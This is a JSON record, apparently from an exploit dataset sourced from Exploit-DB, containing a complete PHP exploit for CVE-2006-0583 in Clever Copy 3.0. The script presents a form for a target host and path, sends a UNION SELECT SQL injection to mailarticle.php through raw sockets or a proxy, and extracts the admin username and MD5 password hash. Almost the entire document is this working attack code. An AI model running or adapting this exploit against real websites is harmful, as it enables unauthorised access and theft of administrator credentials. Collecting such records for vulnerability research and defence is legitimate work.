{
  "id": "1468",
  "title": "Clever Copy 3.0 - Admin Auth Details / SQL Injection",
  "cve": "CVE-2006-0583",
  "vuln_type": "sqli",
  "code": "<?php\r\n#   ---Clever_Copy_V3_sql_xpl.php                          5.00 11/01/2006     #\r\n#                                                                              #\r\n#  Clever Copy <= 3.0 SQL injection / Admin authentication details disclosure  #\r\n#                              coded by rgod                                   #\r\n#                    site: http://retrogod.altervista.org                      #\r\n#                                                                              #\r\n#  -> this works with magic_quotes_gpc = Off                                   #\r\n#  usage: launch from Apache, fill in requested fields, then go!               #\r\n#                                                                              #\r\n#  Sun-Tzu: \"While heading the profit of my counsel, avail yourself also of    #\r\n#  any helpful circumstances over and beyond the ordinary rules\"               #\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\", 5);\r\nob_implicit_flush (1);\r\n\r\necho'<html><head><title>**********Clever Copy V3.0  SQL injection***************\r\n</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<style type=\"text/css\"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:\r\n#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img\r\n{background-color:   #FFFFFF   !important}  input  {background-color:    #303030\r\n!important} option {  background-color:   #303030   !important}         textarea\r\n{background-color: #303030 !important} input {color: #1CB081 !important}  option\r\n{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox\r\n{background-color: #303030 !important} select {font-weight: normal;       color:\r\n#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;\r\nbackground-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:\r\n0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em\r\n!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em\r\n!important} \th2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em\r\n!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:\r\nnormal !important} *{text-decoration: none !important} a:link,a:active,a:visited\r\n{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;\r\ncolor : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-weight:bold; font-style: italic;}--></style></head><body><p class=\"Stile6\">\r\n**********Clever Copy V3.0  SQL injection***************</p><p class=\"Stile6\">a\r\nscript  by  rgod  at    <a href=\"http://retrogod.altervista.org\"target=\"_blank\">\r\nhttp://retrogod.altervista.org</a></p><table width=\"84%\"><tr>   <td width=\"43%\">\r\n<form   name=\"form1\"   method=\"post\"    action=\"'.$_SERVER[PHP_SELF].'\">     <p>\r\n<input type=\"text\" name=\"host\"> <span class=\"Stile5\">* hostname (ex:www.sitename\r\n.com)</span></p><p><input type=\"text\" name=\"path\">   <span class=\"Stile5\">* path\r\n(ex:/clevercopy/ or just / )</span></p><p><input type=\"text\" name=\"prefix\"><span\r\nclass=\"Stile5\"> specify a table prefix (default value: CC_)  </span> </p>    <p>\r\n<input type=\"text\" name=\"port\">  <span class=\"Stile5\"> specify a port other than\r\n80 (default value)      </span></p> <p>  <input  type=\"text\"  name=\"proxy\"><span\r\nclass=\"Stile5\">send exploit through an HTTP proxy (ip:port)</span></p><p> <input\r\ntype=\"submit\" name=\"Submit\" value=\"go!\"></p></form></td></tr> </table>   </body>\r\n</html>';\r\n\r\nfunction show($headeri)\r\n{\r\n  $ii=0;$ji=0;$ki=0;$ci=0;\r\n  echo '<table border=\"0\"><tr>';\r\n  while ($ii <= strlen($headeri)-1){\r\n    $datai=dechex(ord($headeri[$ii]));\r\n    if ($ji==16) {\r\n      $ji=0;\r\n      $ci++;\r\n      echo \"<td>&nbsp;&nbsp;</td>\";\r\n      for ($li=0; $li<=15; $li++) {\r\n        echo \"<td>\".$headeri[$li+$ki].\"</td>\";\r\n\t\t}\r\n      $ki=$ki+16;\r\n      echo \"</tr><tr>\";\r\n    }\r\n    if (strlen($datai)==1) {\r\n      echo \"<td>0\".$datai.\"</td>\";\r\n    }\r\n    else {\r\n      echo \"<td>\".$datai.\"</td> \";\r\n    }\r\n    $ii++;$ji++;\r\n  }\r\n  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {\r\n    echo \"<td>&nbsp&nbsp</td>\";\r\n  }\r\n  for ($li=$ci*16; $li<=strlen($headeri); $li++) {\r\n    echo \"<td>\".$headeri[$li].\"</td>\";\r\n  }\r\n  echo \"</tr></table>\";\r\n}\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction sendpacket() //2x speed\r\n{\r\n  global $proxy, $host, $port, $packet, $html, $proxy_regex;\r\n  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\r\n  if ($socket < 0) {\r\n    echo \"socket_create() failed: reason: \" . socket_strerror($socket) . \"<br>\";\r\n  }\r\n  else {\r\n    $c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {echo 'Not a valid prozy...';\r\n    die;\r\n    }\r\n  echo \"OK.<br>\";\r\n  echo \"Attempting to connect to \".$host.\" on port \".$port.\"...<br>\";\r\n  if ($proxy=='') {\r\n    $result = socket_connect($socket, $host, $port);\r\n  }\r\n  else {\r\n    $parts =explode(':',$proxy);\r\n    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n    $result = socket_connect($socket, $parts[0],$parts[1]);\r\n  }\r\n  if ($result < 0) {\r\n    echo \"socket_connect() failed.\\r\\nReason: (\".$result.\") \" . socket_strerror($result) . \"<br><br>\";\r\n  }\r\n  else {\r\n    echo \"OK.<br><br>\";\r\n    $html= '';\r\n    socket_write($socket, $packet, strlen($packet));\r\n    echo \"Reading response:<br>\";\r\n    while ($out= socket_read($socket, 2048)) {$html.=$out;}\r\n    echo nl2br(htmlentities($html));\r\n    echo \"Closing socket...\";\r\n    socket_close($socket);\r\n  }\r\n  }\r\n}\r\n\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.htmlentities($host); die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid prozy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);echo nl2br(htmlentities($html));\r\n}\r\n\r\n  $host=$_POST[host]; $port=$_POST[port];\r\n  $path=$_POST[path]; $proxy=$_POST[proxy];\r\n  $prefix=$_POST[prefix];\r\n\r\nif (($host<>'') and ($path<>''))\r\n{\r\n  $port=intval(trim($port));\r\n  if ($port=='') {$port=80;}\r\n  if ($prefix=='') {$prefix=\"CC_\";}\r\n  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {die('Error... check the path!');}\r\n  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n  $host=str_replace(\"\\r\\n\",\"\",$host);\r\n  $path=str_replace(\"\\r\\n\",\"\",$path);\r\n\r\n  $SQL =\"'UNION SELECT 0,0,0,0,0,0,concat('***ADMIN***:',username,'***'),concat\";\r\n  $SQL.=\"('***MD5_PWD_HASH***:',password,'***'),0,0,0,0,0,0,0,0,0 FROM \".$prefix.\"admin/*\";\r\n  $SQL=urlencode($SQL);\r\n  $packet=\"GET \".$p.\"mailarticle.php?ID=$SQL HTTP/1.1\\r\\n\";\r\n  $packet.=\"Host: \".$host.\"\\r\\n\";\r\n  $packet.=\"User-Agent: Digger/1.0 JDK/1.3.0rc3\\r\\n\";\r\n  $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n  show($packet);\r\n  sendpacketii($packet);\r\n  $temp=explode(\"***ADMIN***:\",$html);\r\n  $temp2=explode(\"***\",$temp[1]);\r\n  echo \"<strong>\";\r\n  echo \"ADMIN: \".htmlentities($temp2[0]);\r\n  echo \"<br>\";\r\n  $temp=explode(\"***MD5_PWD_HASH***:\",$html);\r\n  $temp2=explode(\"***\",$temp[1]);\r\n  echo \"MD5 HASH: \".htmlentities($temp2[0]);\r\n  echo \"<br>\";\r\n  echo \"</strong>\";\r\n  if ($temp2[0]<>'') {echo \"Exploit succeeded...\";}\r\n\t       else  {echo \"Exploit failed...\";}\r\n}\r\nelse\r\n{echo \"Fill * required fields, optionally specify a proxy...\";}\r\n\r\n?>\r\n\r\n# milw0rm.com [2006-02-04]",
  "url": "https://www.exploit-db.com/exploits/1468"
}